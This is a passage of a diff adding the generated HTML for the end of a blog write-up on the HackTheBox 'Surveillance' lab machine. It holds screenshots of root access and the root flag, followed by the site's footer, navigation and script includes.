+        data-sizes="auto"
+        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-15.png"
+        title="Root Access" width="749" height="1106" /></p>
+<p>The new shell is executed as the <code>root</code> user and the flag can be claimed!</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-16.png"
+        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-16.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-16.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-16.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-16.png"
+        title="Root Flag" width="745" height="342" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 12-13-2023</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2023-12-11-hackthebox-devvortex/" class="prev" rel="prev" title="HackTheBox Devvortex"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox Devvortex</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2015 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://bchoy.me" target="_blank">Brian Choy</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-F9RPBWE7GE', { 'anonymize_ip': true });
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-F9RPBWE7GE" async></script></body>
+</html>
